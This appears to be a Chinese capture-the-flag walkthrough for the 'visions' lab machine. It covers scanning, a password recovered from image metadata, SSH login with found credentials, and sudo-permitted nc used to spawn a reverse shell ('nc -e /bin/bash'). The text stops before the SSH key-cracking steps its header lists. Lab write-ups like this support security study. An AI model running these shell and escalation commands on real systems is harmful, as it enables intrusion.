|   |   |   |
|---|---|---|
|visions|easy|图片隐写、图片调试、exiftool使用、sudo-nc提权、ssh私钥提权、ssh2john使用、john爆破私钥、ssh 私钥利用|
# 主机发现
```C
sudo netdiscover -i eth0 -r 192.168.44.136/24
```
# 服务扫描
```C
sudo nmap -sV -A -T 4 -p- 192.168.44.136 
```
# 目录扫描

右键检查查看源码，猜测是用户名alicia
```C
 http://192.168.44.136/index.html
 
Only those that can see the invisible can do the imposible.
You have to be able to see what doesnt exist.
Only those that can see the invisible being able to see whats not there.
-alicia 

翻译

只有那些能看到无形事物的人才能做到不可能的事情。
你必须能够看到不存在的东西。
只有那些能够看到不可见事物的人才能看到不存在的事物。
-艾丽西亚
```

页面只有个white.png空白图片，猜测是图片隐写
保存下来
查看信息
```C
exiftool white.png
strings white.png

得到： pw:ihaveadream
```
# 提权
sophia/seemstobeimpossible


```C
┌──(kali㉿kali)-[~/下载]
└─$ ssh alicia@192.168.44.136 //ihaveadream

sudo -l //  (emma) NOPASSWD: /usr/bin/nc
sudo -u emma /usr/bin/nc -e /bin/bash 192.168.44.136 2333
```
